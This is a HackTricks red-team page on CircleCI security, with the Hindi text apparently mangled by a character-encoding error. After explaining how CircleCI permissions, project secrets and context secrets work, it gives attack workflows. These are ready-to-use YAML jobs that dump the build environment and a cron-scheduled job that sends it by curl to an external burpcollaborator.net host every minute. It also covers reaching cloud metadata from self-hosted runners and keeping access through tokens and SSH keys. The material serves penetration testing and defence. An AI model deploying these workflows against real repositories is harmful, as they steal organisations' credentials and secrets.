# рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рд╕реБрд░рдХреНрд╖рд╛

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

[**рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ**](https://circleci.com/docs/2.0/about-circleci/) рдПрдХ рд╕рддрдд рдПрдХреАрдХрд░рдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рд╣реИ рдЬрд╣рд╛рдБ рдЖрдк **рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЗрд╕реЗ рдХреБрдЫ рдХреЛрдб рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рдХрдм рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рд╡рд╣ рджрд┐рдЦрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдЖрдк **рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдпрд╛ **рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ** рдХреЛ **рдЕрдкрдиреЗ рд░реЗрдкреЛ рдорд╛рд╕реНрдЯрд░ рдмреНрд░рд╛рдВрдЪ рд╕реЗ рд╕реАрдзреЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдЕрдиреБрдорддрд┐рдпрд╛рдБ

**рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ** **рдЧрд┐рдЯрд╣рдм рдФрд░ рдмрд┐рдЯрдмрдХреЗрдЯ рд╕реЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддрд╛ рд╣реИ** рдЬреЛ **рдЦрд╛рддрд╛** рд▓реЙрдЧ рдЗрди рдХрд░рддрд╛ рд╣реИред\
рдореЗрд░реЗ рдкрд░реАрдХреНрд╖рдг рдореЗрдВ рдореИрдВрдиреЗ рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдХрд┐ рдЬрдм рддрдХ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЧрд┐рдЯрд╣рдм рдореЗрдВ рд░реЗрдкреЛ рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ, рддрдм рдЖрдкрдХреЛ **рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдореЗрдВ рдЗрд╕рдХреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрдЧреА (рдирдП рдПрд╕рдПрд╕рдПрдЪ рдХреБрдВрдЬрд┐рдпрд╛рдБ рд╕реЗрдЯ рдХрд░рдирд╛, рдкрд░рд┐рдпреЛрдЬрдирд╛ рдПрдкреАрдЖрдИ рдХреБрдВрдЬрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдирдП рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЗ рд╕рд╛рде рдирдП рдмреНрд░рд╛рдВрдЪ рдмрдирд╛рдирд╛...).

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдПрдХ **рд░реЗрдкреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдЖрдк **рд░реЗрдкреЛ рдХреЛ рдПрдХ рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд** рдХрд░ рд╕рдХреЗрдВред

## рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдФрд░ рд░рд╣рд╕реНрдп

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝**](https://circleci.com/docs/2.0/env-vars/) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ **рдореВрд▓реНрдпреЛрдВ рдХреЛ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВред

### рдмрд┐рд▓реНрдЯ-рдЗрди рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕

рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдП рдЧрдП рдкреНрд░рддреНрдпреЗрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣рдореЗрд╢рд╛ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) рдЬреИрд╕реЗ `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` рдпрд╛ `CIRCLE_USERNAME` рд╣реЛрдВрдЧреЗред

### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда

рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдПрдХ **рдХрдорд╛рдВрдб** рдХреЗ рднреАрддрд░ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **рд░рди рд╡рд╛рддрд╛рд╡рд░рдг** рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **build-job environment** рдХреЗ рднреАрддрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг** рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### рдкрд░рд┐рдпреЛрдЬрдирд╛ рд░рд╣рд╕реНрдп

рдпреЗ **рд░рд╣рд╕реНрдп** рд╣реИрдВ рдЬреЛ рдХреЗрд╡рд▓ **рдкрд░рд┐рдпреЛрдЬрдирд╛** (рдХрд┐рд╕реА рднреА рд╢рд╛рдЦрд╛ рджреНрд╡рд╛рд░рд╛) рджреНрд╡рд╛рд░рд╛ **рдкрд╣реБрдВрдЪреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЖрдк рдЗрдиреНрд╣реЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдШреЛрд╖рд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**рдЖрдпрд╛рдд рдЪрд░**" рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдпрд╣ рд╕рдВрднрд╡ рдмрдирд╛рддреА рд╣реИ рдХрд┐ рдЗрд╕рдореЗрдВ **рдЕрдиреНрдп рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рд╕реЗ рдЪрд░реЛрдВ рдХреЛ рдЖрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред
{% endhint %}

### рд╕рдВрджрд░реНрдн рд░рд╣рд╕реНрдп

рдпреЗ рд░рд╣рд╕реНрдп рд╣реИрдВ рдЬреЛ **рд╕рдВрдЧрдарди рд╡реНрдпрд╛рдкреА** рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрд┐рд╕реА рднреА рд░реЗрдкреЛ рдХреЛ рдпрд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдП рдЧрдП рдХрд┐рд╕реА рднреА рд░рд╣рд╕реНрдп рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдЧреА:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рднреА рд╕рджрд╕реНрдпреЛрдВ рдХреА рдмрдЬрд╛рдп рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╕рдореВрд╣ (All members рдХреА рдмрдЬрд╛рдп) рдХреЛ **рдЪреБрдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЛ рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХреЗ**ред\
рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рднреА рдХреЛ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рди рджреА рдЬрд╛рдП рдмрд▓реНрдХрд┐ рдХреБрдЫ рд▓реЛрдЧреЛрдВ рдХреЛ рд╣реАред
{% endhint %}

## рд╣рдорд▓реЗ

### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдп рдЦреЛрдЬреЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реАрд╕реАрдПрд╕ рддрдХ рдкрд╣реБрдВрдЪ** рд╣реИ (рдЬреИрд╕реЗ github) рддреЛ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреА рдкреНрд░рддреНрдпреЗрдХ рд╢рд╛рдЦрд╛ рдХреЗ рдлрд╝рд╛рдЗрд▓ `.circleci/config.yml` рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ рд╡рд╣рд╛рдБ рд╕рдВрднрд╛рд╡рд┐рдд **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдп** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВред

### рдЧреБрдкреНрдд рдЪрд░ рдФрд░ рд╕рдВрджрд░реНрдн рдЧрдгрдирд╛

рдХреЛрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░рдХреЗ рдЖрдк рдкреНрд░рддреНрдпреЗрдХ `.circleci/config.yml` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **рд╕рднреА рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рдирд╛рдо** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ рдпрд╛ рдЙрдиреНрд╣реЗрдВ рд╡реЗрдм рдХрдВрд╕реЛрд▓ рдореЗрдВ рдЬрд╛рдБрдЪ рдХрд░рдХреЗ **рд╕рдВрджрд░реНрдн рдирд╛рдо** рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ред

### рдкрд░рд┐рдпреЛрдЬрдирд╛ рд░рд╣рд╕реНрдп рдирд┐рдХрд╛рд▓рдирд╛

{% hint style="warning" %}
рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдФрд░ рд╕рдВрджрд░реНрдн **рд░рд╣рд╕реНрдп** рдХреЛ **рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреЗрд╡рд▓** рдкреВрд░реЗ github рд╕рдВрдЧрдарди рдореЗрдВ **рдХрд┐рд╕реА рднреА рдПрдХ рд░реЗрдкреЛ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА** рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП (_рдФрд░ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЛ рд╕рдВрджрд░реНрднреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╣рд░ рдХреЛрдИ рд╣рд░ рд╕рдВрджрд░реНрдн рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ_ред)
{% endhint %}

{% hint style="danger" %}
"**рдЖрдпрд╛рдд рдЪрд░**" рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдпрд╣ рд╕рдВрднрд╡ рдмрдирд╛рддреА рд╣реИ рдХрд┐ рдЗрд╕рдореЗрдВ **рдЕрдиреНрдп рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рд╕реЗ рдЪрд░реЛрдВ рдХреЛ рдЖрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЪрд░реЛрдВ рдХреЛ рд╕рднреА рд░реЗрдкреЛ рд╕реЗ рдЖрдпрд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ **рдЙрди рд╕рднреА рдХреЛ рдПрдХ рд╕рд╛рде рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ**ред
{% endhint %}

рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рд░рд╣рд╕реНрдп рд╣рдореЗрд╢рд╛ рдиреМрдХрд░рд┐рдпреЛрдВ рдХреЗ env рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ рдПрдирд╡реА рдмреБрд▓рд╛рдирд╛ рдФрд░ рдЙрд╕реЗ base64 рдореЗрдВ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдмрдирд╛рдирд╛ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд╡реЗрдм рд▓реЙрдЧ рдХрдВрд╕реЛрд▓** рдореЗрдВ рдирд┐рдХрд╛рд▓реЗрдЧрд╛:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
рдпрджрд┐ рдЖрдкрдХреЛ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИ** рдФрд░ рдЖрдкрдХреЛ рдкрддрд╛ рд╣реИ рдХрд┐ CircleCI рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рд╡рд░реНрдХрдлреНрд▓реЛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рд╣рд░ рдорд┐рдирдЯ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЬреЛ **рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдПрдХ рдмрд╛рд╣реНрдп рдкрддреЗ рдкрд░ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### рд╕рдВрджрд░реНрдн рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдПрдВ

рдЖрдкрдХреЛ **рд╕рдВрджрд░реНрдн рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдпрд╣ рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдПрдЧрд╛):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
рдпрджрд┐ рдЖрдкрдХреЛ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИ** рдФрд░ рдЖрдкрдХреЛ рдкрддрд╛ рд╣реИ рдХрд┐ CircleCI рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдмрд╕ рдПрдХ рд╡рд░реНрдХрдлреНрд▓реЛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рдкреНрд░рддрд┐ рдорд┐рдирдЯ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЬреЛ **рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдПрдХ рдмрд╛рд╣реНрдп рдкрддреЗ рдкрд░ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
рдХреЗрд╡рд▓ рдПрдХ рдирдП `.circleci/config.yml` рдлрд╝рд╛рдЗрд▓ рд░рд┐рдкреЛ рдореЗрдВ рдмрдирд╛рдирд╛ **рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдмрд┐рд▓реНрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ** рд╣реИред рдЖрдкрдХреЛ **рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдХрдВрд╕реЛрд▓ рдореЗрдВ рдПрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред
{% endhint %}

### рдмрд╛рджрд▓ рдХреЛ рдЫреЛрдбрд╝реЗрдВ

**CircleCI** рдЖрдкрдХреЛ **рдЙрдирдХреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рдпрд╛ рдЕрдкрдиреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЕрдкрдиреЗ рдмрд┐рд▓реНрдб рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИ**ред
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЙрдирдХреА рдорд╢реАрдиреЗрдВ рдЬреАрд╕реАрдкреА рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИрдВ, рдФрд░ рдЖрдк рдкрд╣рд▓реЗ рдХреБрдЫ рднреА рд╕рдВрдмрдВрдзрд┐рдд рдирд╣реАрдВ рдкрд╛ рд╕рдХрддреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреЛрдИ рдкреАрдбрд╝рд┐рдд рдЕрдкрдиреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ **рдЕрдкрдиреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ (рд╕рдВрднрд╛рд╡рдирд╛, рдПрдХ рдмрд╛рджрд▓ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВ)**, рддреЛ рдЖрдкрдХреЛ рдПрдХ **рдмрд╛рджрд▓ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ**ред

рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рдм рдХреБрдЫ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЖрдк рдпрд╣ рднреА **рдПрдХ рд╡реАрдПрдо рдорд╢реАрди рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдмрд╛рджрд▓ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
рдпрд╛ рдлрд┐рд░ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдЬрд┐рд╕рдХрд╛ рд░рд┐рдореЛрдЯ рдбреЙрдХрд░ рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistence

* **рд╕рдВрднрд╡ рд╣реИ** рдХрд┐ **рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯреЛрдХрди рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ** рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде API рдПрдВрдбрдкреНрд╡рд┐рдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗред
* _https://app.circleci.com/settings/user/tokens_
* **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЯреЛрдХрди рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ** рддрд╛рдХрд┐ рдЯреЛрдХрди рдХреЛ рджрд┐рдП рдЧрдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░реЛрдЬреЗрдХреНрдЯ рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗред
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
